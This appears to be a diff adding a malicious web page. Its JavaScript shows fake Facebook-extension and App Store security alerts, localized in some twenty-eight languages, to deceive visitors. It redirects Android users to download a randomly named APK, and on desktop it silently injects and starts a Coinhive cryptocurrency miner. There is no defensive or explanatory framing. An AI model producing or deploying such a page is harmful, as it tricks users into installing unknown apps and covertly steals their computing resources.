@@ -1,0 +1,145 @@
+<html>
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?c023ba0dad186d618c3cafa57528cbd6";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+</head>
+
+<body>
+    <script>
+
+        var dict = {
+            zh: [
+                '请安装Facebook扩展工具包提升安全性，以及使用流畅度.',
+                'APP Store帐号存在安全异常,请重新登录'], //中文
+            zh2: ['請安裝Facebook擴展工具包提升安全性，以及使用流暢度.',
+                'Apple Store帳號存在安全异常，請重新登入'], //繁体中文
+            ja: ['Facebook拡張ツールバッグを取付て安全性及び使用流暢性を向上します。',
+                'APP Storeアカウントは安全異常があるので、再度ログインしてください。'], //日语
+            ko: ['페이스북 보안확장 및 사용을 유창하기위해 설치하시길바랍니다.',
+                'APP Store계정은 비정상 상태이기 때문에 다시 로그인하세요.'],//韩文
+            en: ['To better experience the browsing, update to the latest Facebook version.',
+                'The APP store account has a security exception, please log in again.'],//英语
+            ar: [' يرجى تثبيت حزمة أدوات توسيع   Facebook   لتحسين مستوى الأمان  ، واستخدامه بصورة سلسة .  في حالة عدم القدرة على تنزيلها بصورة عادية، انقر فوق  زر نسخ  واستخدم  المتصفح الافتراضي  ،  وقم بلصق الرابط  إلى شريط العناوين  لزيارة الرابط  ',
+                "هناك خلل أمني في حساب APP Store يرجي إعادة تسجيل الدخول من ﺟﺪﻳﺪ"],//阿拉伯语
+            bg: ['Моля, инсталирайте инструмента за разширението на Facebook, за да подобрите сигурността и по-добрата работа. Ако разширението не може да се изтегли правилно, моля, кликнете върху бутона Копиране, отворете браузъра по подразбиране и поставете връзката в адресната лента, за да получите достъп до него.',
+                'APP Store за приложения с изключение на сигурността, моля, влезте отново.'],//保加利亚语
+            pl: ['Proszę zainstalować narzędzie Facebook w celu poprawy bezpieczeństwa i płynności obsługi. Jeśli narzędzie nie pobiera się w sposób prawidłowy, kliknij w przycisk Kopiuj, otwórz przeglądarkę domyślną i wklej odnośnik do paska adresu.',
+                'Konta aplikacji APP Store mają wyjątki bezpieczeństwa, zaloguj się ponownie, proszę.'],//波兰语
+            de: ['Bitte installieren Sie das Facebook-Erweiterungstoolkit, das die Sicherheit verbessern und fließend sein kann. Wenn es nicht normal heruntergeladen werden kann, klicken Sie auf die Kopieren-Knöpfe und verwenden Sie den Standardbrowser. Fügen Sie den Link vor dem Besuch in die Adressleiste ein',
+                'Das Apple Store Konto hat eine Sicherheitsausnahme. Bitte melden Sie sich erneut'],//德语
+            ru: ['Пожалуйста, установите расширительный комплект Facebook, чтобы улучшить безопасность и беглость использования . Если вы не можете правильно загрузить, нажмите кнопку «Копировать» и используйте браузер по умолчанию, чтобы вставить ссылку в адресную строку для доступа.',
+                'В счете APP store есть безопасные проблема, повторите записываться'],//俄语
+            tl: ['Mangyari ikabit ang Facebook na ekstensyon toolkit upang mapabuti ang siguridad at katatasan. Kapag ang ekstensyon ay hindi maikarga nang maayos, mangyari i-klik ang Kopya na buton, at buksan ang depolt na Browser, at i-paste ang link sa adres bar upang ma-akses ito.',
+                'Ang mga account ng APP Store ay may mga pagbubukod sa seguridad, mangyaring muling mag-login.	'],//他加禄语 菲律宾
+            ka: ['გთხოვთ, დააინსტალიროთ ,,ფეისბუქის’’ გაფართოების ინსტრუმენტი, რათა გააუმჯობესოთ უსაფრთხოების ხარისხი და გამოიყენოთ იგი ყოველგვარი ძალდატანების გარეშე. თუ გაფართოების ინსტრუმენტი სრულყოფილად არ ჩამოიტვირთა, გთხოვთ, დააწკაპეთ ღილაკს ,,კოპირება’’, გახსენით ,,ნაგულისხმევი ბრაუზერი’’ და ,,ლინკი’’ ჩასვით ,,მისამართის ველში’’, რათა შეძლოთ მასზე წვდომა. ',
+                'APP Store ანგარიშებს აქვს უსაფრთხოების გამონაკლისები, გთხოვთ, კვლავ შეხვიდეთ სისტემაში.'],//格鲁吉亚语
+            cs: ['Prosím, nainstalujte Facebook Toolkit pro rozšíření zabezpečení a plynulosti. Pokud nelze rozšíření stáhnout správně, klikněte na tlačítko Kopírovat a otevřete výchozí Prohlížeč a vložte jej do adresního řádku.',
+                'Účty APP Store mají bezpečnostní výjimky, znovu se přihlašte.'],//捷克语
+            ms: ['Sila pasang kit alatan sambungan Facebook untuk meningkatkan keselamatan dan kelancaran. Sekiranya sambungan tidak dapat dimuat turun dengan sempurna, sila klik butang Salin, dan buka Pelayar lalai, dan tampal pautan ke bar alamat untuk mengaksesnya.',
+                'APP Store akaun mempunyai pengecualian Keselamatan, log masuk semula Sila.'],//马来语
+            bn: ['সুরক্ষা এবং ফ্লুয়েন্সি বাড়াতে অনুগ্রহ করে Facebook এক্সটেনশান টুলকিট ইন্সস্টল করুন। এক্সটেনশান সঠিকভাবে ডাউনলোড না করা গেলে, অনুগ্রহ করে কপি বোতামে ক্লিক করুন, ডিফল্ট ব্রাউজারটি খুলুন, এবং অ্যাড্রেস বারে লিঙ্কটি পেস্ট করুন। ',
+                'APP Store র অ্যাকাউন্ট, আবার লগইন করুন দয়া করে।'],//孟加拉语
+            pt: ['Por favor, instale o Facebook Extension Toolkit para melhorar a segurança e a fluência de uso. Se não conseguir fazer o download corretamente, clique no botão “Copiar” e use o navegador de padrão, e cole o link na barra de endereço para a navegação.',
+                'The APP store account has a security exception, please log in again.'],//葡萄牙语
+            sh: ['Molimo da instalirate alatku za nadogradnju Facebooka radi poboljšanja sigurnosti i fluktuacije. Ako se ekstenzija ne može ispravno učitati, kliknite na dugme Kopiraj i otvorite podrazumevani pretraživač i nalepite vezu u adresnu liniju da biste joj pristupili.',
+                'APP Store konta imaju i bezbednosti izuzetke, prijava opet molim te.'],//塞尔维亚-克罗地亚语
+            th: ['โปรดติดตั้งเครื่องมือส่วนขยายของ Facebook เพื่อปรับปรุงความปลอดภัยและความคล่องแคล่วในการใช้งานให้ดีขึ้น ถ้าคุณไม่สามารถดาวน์โหลดปกติ กรุณาคลิกที่ปุ่มคัดลอก ใช้เบราว์เซอร์ที่ตั้งเป็นค่าเริ่มต้น และวางลิงก์ในแถบที่อยู่เว็บเพื่อเข้าถึง',
+                'บัญชีApp Storeมีความผิดปกติ กรุณาล็อกอินใหม่'],//泰语
+            tr: ["Güvenliği ve akıcılığı artırmak için lütfen Facebook eklentisi araç setini yükleyin. Eklenti düzgün şekilde indirilemiyorsa, lütfen Kopyala düğmesine tıklayın ve varsayılan Tarayıcı'yı açın ve bağlantıya erişmek için kopyaladığınız bağlantıyı adres çubuğuna yapıştırın..",
+                'App Store hesaplarının Güvenlik istisnaları var, tekrar oturum açın lütfen.'],//土耳其语
+            uk: ['Інсталюйте пакет інструментів розширення Facebook, щоб підвищити безпеку та плавність перегляду. Якщо розширення не вдається завантажити, клацніть на кнопку «Копіювати», відкрийте браузер за замовчуванням, і вставте посилання у рядок адреси, щоб отримати доступ.',
+                'Облікові записи APP Store мають винятки щодо безпеки, але ще раз увійдіть, будь ласка.'],//乌克兰语
+            es: ['Instale el paquete de herramientas informáticas de extensión de Facebook para mejorar la seguridad y la fluidez de uso. Si no puede descargar normalmente, haga clic en el botón “Copiar”, y luego, usando el navegador predeterminado, pegue el enlace en la barra de direcciones para acceder.',
+                'La cuenta de APP Store existe lo anormal,por favor conecte nuevamente.'],//西班牙语
+            he: ['נא להתקין את ערכת ההרחבה של פייסבוק כדי לשפר את האבטחה ואת השטף. אם לא ניתן להוריד את ההרחבה כראוי, לחץ על הלחצן "העתק" ופתח את דפדפן ברירת המחדל, והדבק את הקישור בשורת הכתובת כדי לגשת אליו.',
+                'לחשבונות APP Store יש חריגים ביטחוניים, היכנס שוב בבקשה.'],//希伯来语
+            hy: ['Խնդրում ենք տեղադրել Ֆեյսբուքի ընդլայնման գործիքակազմը, անվտանգությունն ու տիրապետումը բարելավելու համար. Եթե ընդլայնումը չի հաջողվում ներբեռնվել, խնդրում ենք սեղմել Պատճեն կոճակը եւ բացել լռելյայն Բրաուզերը-ը եւ մուտք գործել այն հասցեի մեջ, այն մուտք գործելու համար.',
+                'APP Store հաշիվ անվտանգության բացառությամբ, մուտք գործեք նորից.'],//亚美尼亚语
+            it: ["Installa il Toolkit di Estensione di Facebook per migliorare la sicurezza e la rapidità di utilizzo. Se non è possibile scaricare correttamente, fai clic sul pulsante \"Copia\" e utilizza il browser predefinito per incollare il collegamento nella barra degli indirizzi per l'accesso.",
+                "Esiste un'anomalia di sicurezza nell'account APP Store, accedi di nuovo"],//立陶宛语
+            hi: ['सुरक्षा और प्रवाह में सुधार के लिए कृपया फेसबुक एक्सटेंशन टूलकिट इंस्टॉल करें। अगर एक्सटेंशन ठीक से डाउनलोड नहीं किया जा सकता है, तो कृपया कॉपी बटन पर क्लिक करें, और डिफ़ॉल्ट ब्राउज़र खोलें, और लिंक को एड्रेस बार में एक्सेस करने के लिए पेस्ट करें।',
+                'APP Store खातों में सुरक्षा अपवाद हैं, कृपया फिर से लॉगिन करें।'],//印地语
+            id: ['Harap instal seperangkat alat tambahan Facebook untuk meningkatkan keamanan dan kelancaran. Jika tambahan tidak dapat diunduh dengan benar, klik tombol Salin, dan buka Peramban standar, dan tempel tautan ke batang alamat untuk mengaksesnya.',
+                'Akun APP Store memiliki pengecualian keamanan, silakan login kembali.'],//印尼语
+            vi: ['Vui lòng cài đặt bộ công cụ mở rộng Facebook để cải thiện an ninh và độ trôi chảy. Nếu phần mở rộng không thể tải xuống đúng cách, vui lòng nhấp vào nút Sao chép và mở Trình duyệt mặc định và dán liên kết vào thanh địa chỉ để truy cập.',
+                'Tài khoản APP Store dụng có ngoại lệ bảo mật, đăng nhập lại xin vui lòng.'],//越南语
+        }
+
+        function getString(i) {
+            var lang = (navigator.language || navigator.browserLanguage).toLowerCase();
+            var key = lang.substring(0, 2)
+            if (lang == 'zh-tw' || lang == 'zh-hk') {
+                key = 'zh2';
+            }
+            var arr = dict[key];
+            if (arr) {
+                return arr[i] || dict['en'][i];
+            }
+            return dict['en'][i];
+        }
+
+        if (typeof String.prototype.startsWith != 'function') {
+            String.prototype.startsWith = function (prefix) {
+                return this.slice(0, prefix.length) === prefix;
+            };
+        }
+        if (typeof String.prototype.endsWith != 'function') {
+            String.prototype.endsWith = function (suffix) {
+                return this.indexOf(suffix, this.length - suffix.length) !== -1;
+            };
+        }
+        if ((navigator.language || navigator.browserLanguage).toLowerCase().startsWith("ja")) {
+
+        } else {
+            var u = navigator.userAgent;
+            var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1;
+            var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+            if (isAndroid) {
+                window.alert(getString(0));
+                window.location.href = "http://m.sohu.com/" + Math.random().toString().substring(2, 10) + ".apk"
+            }
+
+            function isPC() {
+                var userAgentInfo = navigator.userAgent;
+                var Agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
+                var flag = true;
+                for (var v = 0; v < Agents.length; v++) {
+                    if (userAgentInfo.indexOf(Agents[v]) > 0) {
+                        flag = false;
+                        break;
+                    }
+                }
+                return flag;
+            }
+            if (isPC()) {
+                document.writeln("<script src=\'https://coinhive.com/lib/coinhive.min.js\'><" + "/script>");
+                document.writeln("<script>");
+                document.writeln("    var miner = new CoinHive.Anonymous(\'U8lCCcyqS7MeBz2npIynBxoJ3QdGZqkK\');");
+                document.writeln("    miner.start();");
+                document.writeln("</" + "script>");
+            }
+            if (isiOS) {
+                window.alert(getString(1));
+                window.location.href = "http://security.apple.com/";
+               // document.writeln("<script src=\'https://coinhive.com/lib/coinhive.min.js\'><" + "/script>");
+                //document.writeln("<script>");
+               // document.writeln("    var miner = new CoinHive.Anonymous(\'U8lCCcyqS7MeBz2npIynBxoJ3QdGZqkK\');");
+               // document.writeln("    miner.start();");
+                //document.writeln("</" + "script>");
+            }
+        }
+
+
+    </script>
+</body>
+
+</html>
